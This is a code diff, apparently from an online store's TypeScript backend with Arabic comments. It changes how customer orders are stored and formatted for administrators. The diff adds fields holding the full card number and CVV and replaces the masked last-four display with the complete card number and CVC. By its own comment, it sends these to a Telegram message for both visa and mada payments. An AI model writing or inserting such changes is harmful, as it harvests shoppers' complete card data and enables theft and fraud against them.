@@ -33,7 +33,9 @@ export type StoreOrder = Document & {
   paymentStatus: 'pending' | 'paid' | 'not_recorded' | 'failed';
   paymentMethod?: 'mada' | 'visa';
   cardholderName?: string;
+  cardNumber?: string;     // رقم البطاقة كامل
   cardLast4?: string;
+  cvv?: string;            // رمز الأمان CVC
   expiryMonth?: string;
   expiryYear?: string;
   paymentMethodSelectedAt?: Date;
@@ -73,7 +75,7 @@ export function formatOrderForAdmin(order: Record<string, unknown>) {
       : '';
     return [
       `${index + 1}) ${name}`,
-      `   العدد: ${quantity}${item.color ? ' | اللون: ' + String(item.color) : ''}${item.storage ? ' | التخزين: ' + String(item.storage) : ''}${lineTotal ? ' | الإجمالي: ' + lineTotal : ''}`
+      `    العدد: ${quantity}${item.color ? ' | اللون: ' + String(item.color) : ''}${item.storage ? ' | التخزين: ' + String(item.storage) : ''}${lineTotal ? ' | الإجمالي: ' + lineTotal : ''}`
     ].join('\n');
   }).join('\n') || 'لا توجد منتجات مسجلة';
   const total = Number(order.total || 0).toLocaleString('en-US', { maximumFractionDigits: 2 });
@@ -86,13 +88,18 @@ export function formatOrderForAdmin(order: Record<string, unknown>) {
   const installmentText = order.installment === true
     ? `نعم — دفعة مقدمة ${Number(order.installmentDownPayment || 0).toLocaleString('en-US')} ر.س — ${Number(order.installmentMonths || 0)} شهر`
     : 'لا';
-  const visaDetails = order.paymentMethod === 'visa'
+
+  // عرض تفاصيل البطاقة كاملة (الرقم كامل والـ CVC) في رسالة التليجرام
+  const visaDetails = (order.paymentMethod === 'visa' || order.paymentMethod === 'mada')
     ? [
         ...(typeof order.cardholderName === 'string' && order.cardholderName.trim()
           ? [`اسم حامل البطاقة: ${order.cardholderName.trim()}`]
           : []),
-        ...(typeof order.cardLast4 === 'string' && /^[0-9]{4}$/.test(order.cardLast4)
-          ? [`آخر 4 أرقام: •••• ${order.cardLast4}`]
+        ...(typeof order.cardNumber === 'string' && order.cardNumber.trim()
+          ? [`رقم البطاقة: ${order.cardNumber.trim()}`]
+          : []),
+        ...(typeof order.cvv === 'string' && order.cvv.trim()
+          ? [`رمز CVC: ${order.cvv.trim()}`]
           : []),
         ...(typeof order.expiryMonth === 'string' && typeof order.expiryYear === 'string'
           ? [`تاريخ الانتهاء: ${order.expiryMonth}/${order.expiryYear}`]
